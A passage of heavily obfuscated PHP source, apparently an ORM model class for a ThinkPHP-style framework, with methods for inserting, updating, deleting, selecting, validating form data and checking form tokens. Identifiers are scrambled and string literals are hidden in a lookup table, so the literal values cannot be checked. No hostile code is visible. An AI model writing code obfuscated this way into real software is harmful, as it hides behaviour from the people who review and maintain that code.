$÷ÀÍ¥»´[349]) { $©§§Íİ = think_parse_name(substr($ƒ•Šœ•¼, 5)); $ÜœŠ÷éˆ[$©§§Íİ] = $¬ù€ø¾¥[0]; return $this->where($ÜœŠ÷éˆ)->find(); } elseif (strtolower(substr($ƒ•Šœ•¼, 0, 10)) == $÷ÀÍ¥»´[350]) { $ €ùÃü— = think_parse_name(substr($ƒ•Šœ•¼, 10)); $ÜœŠ÷éˆ[$ €ùÃü—] = $¬ù€ø¾¥[0]; return $this->where($ÜœŠ÷éˆ)->getField($¬ù€ø¾¥[1]); } elseif (isset($this->_scope[$ƒ•Šœ•¼])) { return $this->scope($ƒ•Šœ•¼, $¬ù€ø¾¥[0]); } elseif (method_exists($this, $ƒ•Šœ•¼) || method_exists($this, $÷ÀÍ¥»´[351] . $ƒ•Šœ•¼)) { array_unshift($¬ù€ø¾¥, $ƒ•Šœ•¼); return call_user_func_array(array($this, $÷ÀÍ¥»´[352]), $¬ù€ø¾¥); } else { return call_user_func_array(array(parent, $ƒ•Šœ•¼), $¬ù€ø¾¥); } } protected function call() { $ŒÒÑÊ¥Ò =& $_SERVER[áäÒ½¯Ç]; $Ô–Û†û‡ = func_get_args(); $½¿šØü = array_shift($Ô–Û†û‡); $Æáç¤ÇÈ = $½¿šØü; if (is_array($½¿šØü)) { $Æáç¤ÇÈ = $½¿šØü[1]; $½¿šØü = $½¿šØü[0]; } $Õ˜¬çÒõ = count($Ô–Û†û‡) - 1; if (isset($Ô–Û†û‡[$Õ˜¬çÒõ]) && $Ô–Û†û‡[$Õ˜¬çÒõ] === $½¿šØü) { think_exception(__CLASS__ . $ŒÒÑÊ¥Ò[4] . $½¿šØü . think_lang($ŒÒÑÊ¥Ò[353])); return; } $Ô–Û†û‡[] = $½¿šØü; if (method_exists($this, $ŒÒÑÊ¥Ò[354])) { $›¸™ÅŸä = call_user_func_array(array($this, $ŒÒÑÊ¥Ò[355]), array($Æáç¤ÇÈ, $Ô–Û†û‡)); if (!is_null($›¸™ÅŸä) && $›¸™ÅŸä !== !1) { return $›¸™ÅŸä; } } $©äá»üí = !1; if (method_exists($this, $½¿šØü)) { $©äá»üí = call_user_func_array(array($this, $½¿šØü), $Ô–Û†û‡); } if (method_exists($this, $ŒÒÑÊ¥Ò[356])) { $›¸™ÅŸä = call_user_func_array(array($this, $ŒÒÑÊ¥Ò[357]), array($Æáç¤ÇÈ, $Ô–Û†û‡, $©äá»üí)); if ($›¸™ÅŸä) { return $›¸™ÅŸä; } } return $©äá»üí; } protected function _initialize() { } protected function _facade($×áÊÜ) { $òœ¾¬ ” =& $_SERVER[áäÒ½¯Ç]; if (!empty($this->fields)) { foreach ($×áÊÜ as $¹¡ªğæù => $ÇàÆìü) { if (is_array($this->fields) && !in_array($¹¡ªğæù, $this->fields, !0)) { unset($×áÊÜ[$¹¡ªğæù]); } elseif (is_scalar($ÇàÆìü)) { $this->_parseType($×áÊÜ, $¹¡ªğæù); } } } if (!empty($this->options[$òœ¾¬ ”[358]])) { $×áÊÜ = array_map($this->options[$òœ¾¬ ”[358]], $×áÊÜ); unset($this->options[$òœ¾¬ ”[358]]); } $this->_beforeWrite($×áÊÜ); return $×áÊÜ; } protected function _beforeWrite(&$À„—Øµ) { } public function add($††©‘É¡ = '', $ïÂ‘èÁ = array(), $¹Ï„ = false) { if (empty($††©‘É¡)) { if (!empty($this->data)) { $††©‘É¡ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[áäÒ½¯Ç][359]); return !1; } } $ïÂ‘èÁ = $this->_parseOptions($ïÂ‘èÁ); $††©‘É¡ = $this->_facade($††©‘É¡); if (!1 === $this->_beforeInsert($††©‘É¡, $ïÂ‘èÁ)) { return !1; } $øá€ÃÆè = $this->db->insert($††©‘É¡, $ïÂ‘èÁ, $¹Ï„); if (!1 !== $øá€ÃÆè) { $áïƒœ®§ = $this->getLastInsID(); if ($áïƒœ®§) { $††©‘É¡[$this->getPk()] = $áïƒœ®§; $this->_after_insert($††©‘É¡, $ïÂ‘èÁ); return $áïƒœ®§; } $this->_after_insert($††©‘É¡, $ïÂ‘èÁ); } return $øá€ÃÆè; } protected function _beforeInsert(&$…â‰íåâ, $—º³á–£) { } protected function _after_insert($§şó­Ö, $¼é»õ‚Ñ) { } public function addAll($¯ŸÙÌ§´, $¡«ˆòêµ = array(), $ÉæÚ§•¹ = false) { $ÊÄş¼ß½ =& $_SERVER[áäÒ½¯Ç]; if (empty($¯ŸÙÌ§´)) { $this->error = think_lang($ÊÄş¼ß½[359]); return !1; } $¡«ˆòêµ = $this->_parseOptions($¡«ˆòêµ); foreach ($¯ŸÙÌ§´ as $‘¨××§Ô => $³„Û¡²) { $¯ŸÙÌ§´[$‘¨××§Ô] = $this->_facade($³„Û¡²); } if (method_exists($this->db, $ÊÄş¼ß½[360])) { $ŠÃò²Í = $this->db->insertAll($¯ŸÙÌ§´, $¡«ˆòêµ, $ÉæÚ§•¹); } else { $this->startTrans(); foreach ($¯ŸÙÌ§´ as $‘¨××§Ô => $³„Û¡²) { $ŠÃò²Í = $this->db->insert($³„Û¡², $¡«ˆòêµ, $ÉæÚ§•¹); } $this->commit(); } if (!1 !== $ŠÃò²Í) { $”ÃüÄôŸ = $this->getLastInsID(); if ($”ÃüÄôŸ) { return $”ÃüÄôŸ; } } return $ŠÃò²Í; } public function selectAdd($øÌ³µß = '', $íô¸©¡ø = '', $ÚÓ¼Öïˆ = array()) { $·¦üë©Â =& $_SERVER[áäÒ½¯Ç]; $ÚÓ¼Öïˆ = $this->_parseOptions($ÚÓ¼Öïˆ); if (!1 === ($ñÓéÍÀÀ = $this->db->selectInsert($øÌ³µß ? $øÌ³µß : $ÚÓ¼Öïˆ[$·¦üë©Â[361]], $íô¸©¡ø ? $íô¸©¡ø : $this->getTableName(), $ÚÓ¼Öïˆ))) { $this->error = think_lang($·¦üë©Â[362]); return !1; } else { return $ñÓéÍÀÀ; } } public function save($ÄúÙÔÕ• = '', $èÕ¶çç = array()) { $Ò»ş¾Ù =& $_SERVER[áäÒ½¯Ç]; if (empty($ÄúÙÔÕ•)) { if (!empty($this->data)) { $ÄúÙÔÕ• = $this->data; $this->data = array(); } else { $this->error = think_lang($Ò»ş¾Ù[359]); return !1; } } $ÄúÙÔÕ• = $this->_facade($ÄúÙÔÕ•); $èÕ¶çç = $this->_parseOptions($èÕ¶çç); $ÑÈÜä = $this->getPk(); if (!isset($èÕ¶çç[$Ò»ş¾Ù[363]])) { if (isset($ÄúÙÔÕ•[$ÑÈÜä])) { $À°Ë‚°Ò[$ÑÈÜä] = $ÄúÙÔÕ•[$ÑÈÜä]; $èÕ¶çç[$Ò»ş¾Ù[363]] = $À°Ë‚°Ò; unset($ÄúÙÔÕ•[$ÑÈÜä]); } else { $this->error = think_lang($Ò»ş¾Ù[362]); return !1; } } if (is_array($èÕ¶çç[$Ò»ş¾Ù[363]]) && isset($èÕ¶çç[$Ò»ş¾Ù[363]][$ÑÈÜä])) { $×ƒš¢¹Õ = $èÕ¶çç[$Ò»ş¾Ù[363]][$ÑÈÜä]; } if (!1 === $this->_beforeUpdate($ÄúÙÔÕ•, $èÕ¶çç)) { return !1; } $æ•ƒ­Å· = $this->db->update($ÄúÙÔÕ•, $èÕ¶çç); if (!1 !== $æ•ƒ­Å·) { if (isset($×ƒš¢¹Õ)) { $ÄúÙÔÕ•[$ÑÈÜä] = $×ƒš¢¹Õ; } $this->_afterUpdate($ÄúÙÔÕ•, $èÕ¶çç); } return $æ•ƒ­Å·; } protected function _beforeUpdate(&$âŞ¤ê…â, $Ğ€†È“ì) { } protected function _afterUpdate($ÉÑø´, $û¨›ã”) { } public function delete($òùâ¤Ş = array()) { $´·Ï¥í£ =& $_SERVER[áäÒ½¯Ç]; if (empty($òùâ¤Ş) && empty($this->options[$´·Ï¥í£[363]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $’ÑÑçËÑ = $this->getPk(); if (is_numeric($òùâ¤Ş) || is_string($òùâ¤Ş)) { if (strpos($òùâ¤Ş, $´·Ï¥í£[50])) { $ø»Òó«[$’ÑÑçËÑ] = array($´·Ï¥í£[364], $òùâ¤Ş); } else { $ø»Òó«[$’ÑÑçËÑ] = $òùâ¤Ş; } $this->options[$´·Ï¥í£[363]] = $ø»Òó«; } $òùâ¤Ş = $this->_parseOptions(); if (is_array($òùâ¤Ş[$´·Ï¥í£[363]]) && isset($òùâ¤Ş[$´·Ï¥í£[363]][$’ÑÑçËÑ])) { $¼ÍÏõ˜ï = $òùâ¤Ş[$´·Ï¥í£[363]][$’ÑÑçËÑ]; } $Í îë™¼ = $this->db->delete($òùâ¤Ş); if (!1 !== $Í îë™¼) { $ÃÕÔš’È = array(); if (isset($¼ÍÏõ˜ï)) { $ÃÕÔš’È[$’ÑÑçËÑ] = $¼ÍÏõ˜ï; } $this->_after_delete($ÃÕÔš’È, $òùâ¤Ş); } return $Í îë™¼; } protected function _after_delete($Â˜Ó–Õ, $‰›´ÀøŞ) { } public function select($¥ä«¯ = array()) { $à¨‘Ç˜Á =& $_SERVER[áäÒ½¯Ç]; if (is_string($¥ä«¯) || is_numeric($¥ä«¯)) { $ÏÂ†åñ = $this->getPk(); if (strpos($¥ä«¯, $à¨‘Ç˜Á[50])) { $Éˆ±—½Ã[$ÏÂ†åñ] = array($à¨‘Ç˜Á[364], $¥ä«¯); } else { $Éˆ±—½Ã[$ÏÂ†åñ] = $¥ä«¯; } $this->options[$à¨‘Ç˜Á[363]] = $Éˆ±—½Ã; } elseif (!1 === $¥ä«¯) { $¥ä«¯ = $this->_parseOptions(); return $à¨‘Ç˜Á[365] . $this->db->buildSelectSql($¥ä«¯) . $à¨‘Ç˜Á[366]; } $¥ä«¯ = $this->_parseOptions(); $¢‹ç¶‡ = $this->db->select($¥ä«¯); if (!1 === $¢‹ç¶‡) { return !1; } if (empty($¢‹ç¶‡)) { return null; } $this->_afterSelect($¢‹ç¶‡, $¥ä«¯); return $¢‹ç¶‡; } protected function _afterSelect(&$ÀŞÏ¦ê«, $«Ê†ĞöĞ) { } public function buildSql($¢¡ä·Ç™ = array()) { $¡õ™öİ× =& $_SERVER[áäÒ½¯Ç]; $¢¡ä·Ç™ = $this->_parseOptions($¢¡ä·Ç™); return $¡õ™öİ×[365] . $this->db->buildSelectSql($¢¡ä·Ç™) . $¡õ™öİ×[366]; } public function optionsValue($â”Ï¼§Ÿ = null) { if (is_null($â”Ï¼§Ÿ)) { return $this->options; } elseif (is_array($â”Ï¼§Ÿ)) { $this->options = array_merge($this->options, $â”Ï¼§Ÿ); } } protected function _parseOptions($Ş¨æ»»Ğ = array()) { $ òÃÎé€ =& $_SERVER[áäÒ½¯Ç]; if (is_array($Ş¨æ»»Ğ)) { $Ş¨æ»»Ğ = array_merge($this->options, $Ş¨æ»»Ğ); } $this->options = array(); if (!isset($Ş¨æ»»Ğ[$ òÃÎé€[367]])) { $Ş¨æ»»Ğ[$ òÃÎé€[367]] = $this->getTableName(); $çÒŒ‡³î = $this->fields; } else { $çÒŒ‡³î = $this->getDbFields(); } if (!empty($Ş¨æ»»Ğ[$ òÃÎé€[368]])) { $Ş¨æ»»Ğ[$ òÃÎé€[367]] .= $ òÃÎé€[53] . $Ş¨æ»»Ğ[$ òÃÎé€[368]]; } $Ş¨æ»»Ğ[$ òÃÎé€[369]] = $this->name; if (isset($Ş¨æ»»Ğ[$ òÃÎé€[363]]) && is_array($Ş¨æ»»Ğ[$ òÃÎé€[363]]) && !empty($çÒŒ‡³î) && !isset($Ş¨æ»»Ğ[$ òÃÎé€[370]]) && !isset($Ş¨æ»»Ğ[$ òÃÎé€[367]])) { foreach ($Ş¨æ»»Ğ[$ òÃÎé€[363]] as $â³şãı“ => $Â¸…·ñ¤) { $â³şãı“ = trim($â³şãı“); if (in_array($â³şãı“, $çÒŒ‡³î, !0)) { if (is_scalar($Â¸…·ñ¤)) { $this->_parseType($Ş¨æ»»Ğ[$ òÃÎé€[363]], $â³şãı“); } } elseif (!is_numeric($â³şãı“) && $ òÃÎé€[11] != substr($â³şãı“, 0, 1) && !1 === strpos($â³şãı“, $ òÃÎé€[10]) && !1 === strpos($â³şãı“, $ òÃÎé€[347]) && !1 === strpos($â³şãı“, $ òÃÎé€[213]) && !1 === strpos($â³şãı“, $ òÃÎé€[295])) { unset($Ş¨æ»»Ğ[$ òÃÎé€[363]][$â³şãı“]); } } } $this->_options_filter($Ş¨æ»»Ğ); return $Ş¨æ»»Ğ; } protected function _options_filter(&$¢ıœ¬ü¿) { } protected function _parseType(&$©šûáµ¬, $î™Ô±­¹) { $®®Ÿõ×ƒ =& $_SERVER[áäÒ½¯Ç]; if (empty($this->options[$®®Ÿõ×ƒ[371]][$®®Ÿõ×ƒ[4] . $î™Ô±­¹])) { $ƒŞò¤Ä = strtolower($this->fields[$®®Ÿõ×ƒ[339]][$î™Ô±­¹]); if (!1 !== strpos($ƒŞò¤Ä, $®®Ÿõ×ƒ[372])) { } elseif (!1 === strpos($ƒŞò¤Ä, $®®Ÿõ×ƒ[373]) && !1 !== strpos($ƒŞò¤Ä, $®®Ÿõ×ƒ[374])) { $©šûáµ¬[$î™Ô±­¹] = intval($©šûáµ¬[$î™Ô±­¹]); } elseif (!1 !== strpos($ƒŞò¤Ä, $®®Ÿõ×ƒ[375]) || !1 !== strpos($ƒŞò¤Ä, $®®Ÿõ×ƒ[376])) { $©šûáµ¬[$î™Ô±­¹] = floatval($©šûáµ¬[$î™Ô±­¹]); } elseif (!1 !== strpos($ƒŞò¤Ä, $®®Ÿõ×ƒ[377])) { $©šûáµ¬[$î™Ô±­¹] = (bool) $©šûáµ¬[$î™Ô±­¹]; } } } public function find($Û–¥È“¸ = array()) { $‡†´íà =& $_SERVER[áäÒ½¯Ç]; if (is_numeric($Û–¥È“¸) || is_string($Û–¥È“¸)) { $Ëû ±ª¢[$this->getPk()] = intval($Û–¥È“¸); $this->options[$‡†´íà[363]] = $Ëû ±ª¢; } $this->options[$‡†´íà[378]] = 1; $Û–¥È“¸ = $this->_parseOptions(); $î™®œâ = $this->db->select($Û–¥È“¸); if (!1 === $î™®œâ) { return !1; } if (empty($î™®œâ)) { return null; } $ ¤Ê½®¦ = $î™®œâ[0]; $this->_afterFind($ ¤Ê½®¦, $Û–¥È“¸); return $ ¤Ê½®¦; } protected function _afterFind(&$Î’¹ğµò, $¬ˆİÓ”à) { } protected function returnResult($ôÛÆ¶¸, $ÉŠ”ÏÈÄ = '') { $ËÀÕ’Œ… =& $_SERVER[áäÒ½¯Ç]; if ($ÉŠ”ÏÈÄ) { if (is_callable($ÉŠ”ÏÈÄ)) { return call_user_func($ÉŠ”ÏÈÄ, $ôÛÆ¶¸); } switch (strtolower($ÉŠ”ÏÈÄ)) { case $ËÀÕ’Œ…[379]: return json_encode($ôÛÆ¶¸); case $ËÀÕ’Œ…[380]: return xml_encode($ôÛÆ¶¸); } } return $ôÛÆ¶¸; } public function parseFieldsMap($ËÁ£œ‰ô, $Œìºéªø = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ê˜ê–Å => $ÏŒî¨ì) { if ($Œìºéªø == 1) { if (isset($ËÁ£œ‰ô[$ÏŒî¨ì])) { $ËÁ£œ‰ô[$ê˜ê–Å] = $ËÁ£œ‰ô[$ÏŒî¨ì]; unset($ËÁ£œ‰ô[$ÏŒî¨ì]); } } else { if (isset($ËÁ£œ‰ô[$ê˜ê–Å])) { $ËÁ£œ‰ô[$ÏŒî¨ì] = $ËÁ£œ‰ô[$ê˜ê–Å]; unset($ËÁ£œ‰ô[$ê˜ê–Å]); } } } } return $ËÁ£œ‰ô; } public function setField($Ü×èÛª, $á´Úë¶Ç = '') { if (is_array($Ü×èÛª)) { $ßôó·şú = $Ü×èÛª; } else { $ßôó·şú[$Ü×èÛª] = $á´Úë¶Ç; } return $this->save($ßôó·şú); } public function setAdd($¿ùäù¼¡, $çÃÂ¦µ = 1) { $ÂÍÜ²¯ =& $_SERVER[áäÒ½¯Ç]; $îò±ğ·® = $¿ùäù¼¡ . $ÂÍÜ²¯[381] . $çÃÂ¦µ; if ($çÃÂ¦µ < 0) { $îò±ğ·® = $¿ùäù¼¡ . $çÃÂ¦µ; } return $this->setField($¿ùäù¼¡, array($ÂÍÜ²¯[382], $îò±ğ·®)); } public function getField($¶Ìæõ, $èâ –á = null) { $Ü Á…ÕÈ =& $_SERVER[áäÒ½¯Ç]; $ïÍ¾Ù®À[$Ü Á…ÕÈ[361]] = $¶Ìæõ; $ïÍ¾Ù®À = $this->_parseOptions($ïÍ¾Ù®À); $¶Ìæõ = trim($¶Ìæõ); if (strpos($¶Ìæõ, $Ü Á…ÕÈ[50])) { if (!isset($ïÍ¾Ù®À[$Ü Á…ÕÈ[378]])) { $ïÍ¾Ù®À[$Ü Á…ÕÈ[378]] = is_numeric($èâ –á) ? $èâ –á : $Ü Á…ÕÈ[12]; } $öú ‚Ù˜ = $this->db->select($ïÍ¾Ù®À); if (!empty($öú ‚Ù˜)) { $ïøĞšÖ’ = explode($Ü Á…ÕÈ[50], $¶Ìæõ); $¶Ìæõ = array_keys($öú ‚Ù˜[0]); $÷–éƒÅğ = array_shift($¶Ìæõ); $µó‚å›— = array_shift($¶Ìæõ); $™ãîİ«Ò = array(); $ØÓï•©´ = count($ïøĞšÖ’); foreach ($öú ‚Ù˜ as $ƒÎ²Ü´ã) { $‘¸ÑÙöò = $ƒÎ²Ü´ã[$÷–éƒÅğ]; if (2 == $ØÓï•©´) { $™ãîİ«Ò[$‘¸ÑÙöò] = $ƒÎ²Ü´ã[$µó‚å›—]; } else { $™ãîİ«Ò[$‘¸ÑÙöò] = is_string($èâ –á) ? implode($èâ –á, $ƒÎ²Ü´ã) : $ƒÎ²Ü´ã; } } return $™ãîİ«Ò; } } else { if (!0 !== $èâ –á) { $ïÍ¾Ù®À[$Ü Á…ÕÈ[378]] = is_numeric($èâ –á) ? $èâ –á : 1; } if ($èâ –á === $Ü Á…ÕÈ[342]) { unset($ïÍ¾Ù®À[$Ü Á…ÕÈ[378]]); } $ƒÎ²Ü´ã = $this->db->select($ïÍ¾Ù®À); if (!empty($ƒÎ²Ü´ã)) { if ($èâ –á === $Ü Á…ÕÈ[342]) { return reset($ƒÎ²Ü´ã[0]); } if (!0 !== $èâ –á && 1 == $ïÍ¾Ù®À[$Ü Á…ÕÈ[378]]) { return reset($ƒÎ²Ü´ã[0]); } foreach ($ƒÎ²Ü´ã as $œÁ«ÖÓ ) { $ş¤”åä½[] = $œÁ«ÖÓ [$¶Ìæõ]; } return $ş¤”åä½; } } return null; } public function create($¢Àô¹îê = '', $š°ÒÁ = '') { $ç·ÎªŒÈ =& $_SERVER[áäÒ½¯Ç]; if (empty($¢Àô¹îê)) { $¢Àô¹îê = $_POST; } elseif (is_object($¢Àô¹îê)) { $¢Àô¹îê = get_object_vars($¢Àô¹îê); } if (empty($¢Àô¹îê) || !is_array($¢Àô¹îê)) { $this->error = think_lang($ç·ÎªŒÈ[359]); return !1; } $¢Àô¹îê = $this->parseFieldsMap($¢Àô¹îê, 0); $š°ÒÁ = $š°ÒÁ ? $š°ÒÁ : (!empty($¢Àô¹îê[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ç·ÎªŒÈ[361]])) { $¡º¦çûŸ = $this->options[$ç·ÎªŒÈ[361]]; unset($this->options[$ç·ÎªŒÈ[361]]); } elseif ($š°ÒÁ == THINK_MODEL_INSERT && isset($this->insertFields)) { $¡º¦çûŸ = $this->insertFields; } elseif ($š°ÒÁ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $¡º¦çûŸ = $this->updateFields; } if (isset($¡º¦çûŸ)) { if (is_string($¡º¦çûŸ)) { $¡º¦çûŸ = explode($ç·ÎªŒÈ[50], $¡º¦çûŸ); } if (think_config($ç·ÎªŒÈ[383])) { $¡º¦çûŸ[] = think_config($ç·ÎªŒÈ[384]); } foreach ($¢Àô¹îê as $Š½ï©¨… => $Íé’òÚ) { if (!in_array($Š½ï©¨…, $¡º¦çûŸ)) { unset($¢Àô¹îê[$Š½ï©¨…]); } } } if (!$this->autoValidation($¢Àô¹îê, $š°ÒÁ)) { return !1; } if (!$this->autoCheckToken($¢Àô¹îê)) { $this->error = think_lang($ç·ÎªŒÈ[385]); return !1; } if ($this->autoCheckFields) { $¡º¦çûŸ = $this->getDbFields(); foreach ($¢Àô¹îê as $Š½ï©¨… => $Íé’òÚ) { if (!in_array($Š½ï©¨…, $¡º¦çûŸ)) { unset($¢Àô¹îê[$Š½ï©¨…]); } elseif (MAGIC_QUOTES_GPC && is_string($Íé’òÚ)) { $¢Àô¹îê[$Š½ï©¨…] = stripslashes($Íé’òÚ); } } } $this->autoOperation($¢Àô¹îê, $š°ÒÁ); $this->data = $¢Àô¹îê; return $¢Àô¹îê; } public function autoCheckToken($‡°íŞş) { $ğôŸòš =& $_SERVER[áäÒ½¯Ç]; if (isset($this->options[$ğôŸòš[386]]) && !$this->options[$ğôŸòš[386]]) { return !0; } if (think_config($ğôŸòš[383])) { $âöÖ›¬ = think_config($ğôŸòš[384]); if (!isset($‡°íŞş[$âöÖ›¬]) || Session::get($âöÖ›¬)) { return !1; } list($¯²©ü‹‹, $Îõ Î‹Ô) = explode($ğôŸòš[11], $‡°íŞş[$âöÖ›¬]); if ($Îõ Î‹Ô && Session::get($âöÖ›¬ . $ğôŸòš[10] . $¯²©ü‹‹) === $Îõ Î‹Ô) { Session::remove($âöÖ›¬ . $ğôŸòš[10] . $¯²©ü‹‹); return !0; } if (think_config($ğôŸòš[387])) { Session::remove($âöÖ›¬ . $ğôŸòš[10] . $¯²©ü‹‹); } return !1; } return !0; } public function regex($Ã†¨Ù™ô, $‚èšÅšõ) { $¹¿ ö• =& $_SERVER[áäÒ½¯Ç]; $ÒÚÙáˆó = array($¹¿ ö•[388] => $¹¿ ö•[389], $¹¿ ö•[390] => $¹¿ ö•[391], $¹¿ ö•[392] => $¹¿ ö•[393], $¹¿ ö•[394] => $¹¿ ö•[395], $¹¿ ö•[396] => $¹¿ ö•[397], $¹¿ ö•[398] => $¹¿ ö•[399], $¹¿ ö•[400] => $¹¿ ö•[401], $¹¿ ö•[376] => $¹¿ ö•[402], $¹¿ ö•[403] => $¹¿ ö•[404]); if (isset($ÒÚÙáˆó[strtolower($‚èšÅšõ)])) { $‚èšÅšõ = $ÒÚÙáˆó[strtolower($‚èšÅšõ)]; } return preg_match($‚èšÅšõ, $Ã†¨Ù™ô) === 1; } private function autoOperation(&$¦œÕÒæÂ, $„–„§Õ) { $¿¿µúå =& $_SERVER[áäÒ½¯Ç]; if (!empty($this->options[$¿¿µúå[405]])) { $³Íş¬ê™ = $this->options[$¿¿µúå[405]]; unset($this->options[$¿¿µúå[405]]); } elseif (!empty($this->_auto)) { $³Íş¬ê™ = $this->_auto; } if (isset($³Íş¬ê™)) { foreach ($³Íş¬ê™ as $ø’ÒÓË) { if (empty($ø’ÒÓË[2])) { $ø’ÒÓË[2] = THINK_MODEL_INSERT; } if ($„–„§Õ == $ø’ÒÓË[2] || $ø’ÒÓË[2] == THINK_MODEL_BOTH) { switch (trim($ø’ÒÓË[3])) { case $¿¿µúå[406]: case $¿¿µúå[407]: $ÛÁ½ñû¨ = isset($ø’ÒÓË[4]) ? (array) $ø’ÒÓË[4] : array(); if (isset($¦œÕÒæÂ[$ø’ÒÓË[0]])) { array_unshift($ÛÁ½ñû¨, $¦œÕÒæÂ[$ø’ÒÓË[0]]); } if ($¿¿µúå[406] == $ø’ÒÓË[3]) { $¦œÕÒæÂ[$ø’ÒÓË[0]] = call_user_func_array($ø’ÒÓË[1], $ÛÁ½ñû¨); } else { $¦œÕÒæÂ[$ø’ÒÓË[0]] = call_user_func_array(array(&$this, $ø’ÒÓË[1]), $ÛÁ½ñû¨); } break; case $¿¿µúå[361]: $¦œÕÒæÂ[$ø’ÒÓË[0]] = $¦œÕÒæÂ[$ø’ÒÓË[1]]; break; case $¿¿µúå[408]: if ($¿¿µúå[12] === $¦œÕÒæÂ[$ø’ÒÓË[0]]) { unset($¦œÕÒæÂ[$ø’ÒÓË[0]]); } break; case $¿¿µúå[409]: default: $¦œÕÒæÂ[$ø’ÒÓË[0]] = $ø’ÒÓË[1]; } if (!1 === $¦œÕÒæÂ[$ø’ÒÓË[0]]) { unset($¦œÕÒæÂ[$ø’ÒÓË[0]]); } } } } return $¦œÕÒæÂ; } protected function autoValidation($²ÌöĞÙ , $Ú¤¼Ñ¶ã) { $–Â¡‰âÒ =& $_SERVER[áäÒ½¯Ç]; if (!empty($this->options[$–Â¡‰âÒ[410]])) { $Ì–ğ¡©  = $this->options[$–Â¡‰âÒ[410]]; unset($this->options[$–Â¡‰âÒ[410]]); } elseif (!empty($this->_validate)) { $Ì–ğ¡©  = $this->_validate; } if (isset($Ì–ğ¡© )) { if ($this->patchValidate) { $this->error = array(); } foreach ($Ì–ğ¡©  as $•„¥æ½… => $ªÔÂéº) { if (empty($ªÔÂéº[5]) || $ªÔÂéº[5] == THINK_MODEL_BOTH || $ªÔÂéº[5] == $Ú¤¼Ñ¶ã) { if (0 == strpos($ªÔÂéº[2], $–Â¡‰âÒ[411]) && strpos($ªÔÂéº[2], $–Â¡‰âÒ[412])) { $ªÔÂéº[2] = think_lang(substr($ªÔÂéº[2], 2, -1)); } $ªÔÂéº[3] = isset($ªÔÂéº[3]) ? $ªÔÂéº[3] : THINK_EXISTS_VALIDATE; $ªÔÂéº[4] = isset($ªÔÂéº[4]) ? $ªÔÂéº[4] : $–Â¡‰âÒ[413]; switch ($ªÔÂéº[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($²ÌöĞÙ , $ªÔÂéº)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($–Â¡‰âÒ[12] != trim($²ÌöĞÙ [$ªÔÂéº[0]])) { if (!1 === $this->_validationField($²ÌöĞÙ , $ªÔÂéº)) { return !1; } } break; default: if (isset($²ÌöĞÙ [$ªÔÂéº[0]])) { if (!1 === $this->_validationField($²ÌöĞÙ , $ªÔÂéº)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($à¶Åİñ©, $öå¢é) { if (!1 === $this->_validationFieldItem($à¶Åİñ©, $öå¢é)) { if ($this->patchValidate) { $this->error[$öå¢é[0]] = $öå¢é[2]; } else { $this->error = $öå¢é[2]; return !1; } } return; } protected function _validationFieldItem($·ü§úª², $½àÍÓßğ) { $û–ƒƒô­ =& $_SERVER[áäÒ½¯Ç]; switch (strtolower(trim($½àÍÓßğ[4]))) { case $û–ƒƒô­[406]: case $û–ƒƒô­[407]: $Îî¡€Í = isset($½àÍÓßğ[6]) ? (array) $½àÍÓßğ[6] : array(); if (is_string($½àÍÓßğ[0]) && strpos($½àÍÓßğ[0], $û–ƒƒô­[50])) { $½àÍÓßğ[0] = explode($û–ƒƒô­[50], $½àÍÓßğ[0]); } if (is_array($½àÍÓßğ[0])) { foreach ($½àÍÓßğ[0] as $É¿÷œ) { $´ïÀÂÒ[$É¿÷œ] = $·ü§úª²[$É¿÷œ]; } array_unshift($Îî¡€Í, $´ïÀÂÒ); } else { array_unshift($Îî¡€Í, $·ü§úª²[$½àÍÓßğ[0]]); } if ($û–ƒƒô­[406] == $½àÍÓßğ[4]) { return call_user_func_array($½àÍÓßğ[1], $Îî¡€Í); } else { return call_user_func_array(array(&$this, $½àÍÓßğ[1]), $Îî¡€Í); } case $û–ƒƒô­[414]: return $·ü§úª²[$½àÍÓßğ[0]] == $·ü§úª²[$½àÍÓßğ[1]]; case $û–ƒƒô­[415]: if (is_string($½àÍÓßğ[0]) && strpos($½àÍÓßğ[0], $û–ƒƒô­[50])) { $½àÍÓßğ[0] = explode($û–ƒƒô­[50], $½àÍÓßğ[0]); } $¦à¹ĞĞğ = array(); if (is_array($½àÍÓßğ[0])) { foreach ($½àÍÓßğ[0] as $É¿÷œ) { $¦à¹ĞĞğ[$É¿÷œ] = $·ü§úª²[$É¿÷œ]; } } else { $¦à¹ĞĞğ[$½àÍÓßğ[0]] = $·ü§úª²[$½àÍÓßğ[0]]; } if (!empty($·ü§úª²[$this->getPk()])) { $¦à¹ĞĞğ[$this->getPk()] = array($û–ƒƒô­[416], $·ü§úª²[$this->getPk()]); } if ($this->where($¦à¹ĞĞğ)->find()) { return !1; } return !0; default: return $this->check($·ü§úª²[$½àÍÓßğ[0]], $½àÍÓßğ[1], $½àÍÓßğ[4]); } } public function check($­×½Áä“, $±šëÜ²à, $äüÆ©èü = "\162\145\147\x65\x78") { $°ÈŠæüõ =& $_SERVER[áäÒ½¯Ç]; $äüÆ©èü = strtolower(trim($äüÆ©èü)); switch ($äüÆ©èü) { case $°ÈŠæüõ[7]: case $°ÈŠæüõ[417]: $àŒ¿Æ×Æ = is_array($±šëÜ²à) ? $±šëÜ²à : explode($°ÈŠæüõ[50], $±šëÜ²à); return $äüÆ©èü == $°ÈŠæüõ[7] ? in_array($­×½Áä“, $àŒ¿Æ×Æ) : !in_array($­×½Áä“, $àŒ¿Æ×Æ); case $°ÈŠæüõ[418]: case $°ÈŠæüõ[419]: if (is_array($±šëÜ²à)) { $íƒÎı“ = $±šëÜ²à[0]; $±Ğ”›İ = $±šëÜ²à[1]; } else { list($íƒÎı“, $±Ğ”›İ) = explode($°ÈŠæüõ[50], $±šëÜ²à); } return $äüÆ©èü == $°ÈŠæüõ[418] ? $­×½Áä“ >= $íƒÎı“ && $­×½Áä“ <= $±Ğ”›İ : $­×½Áä“ < $íƒÎı“ || $­×½Áä“ > $±Ğ”›İ; case $°ÈŠæüõ[420]: case $°ÈŠæüõ[421]: return $äüÆ©èü == 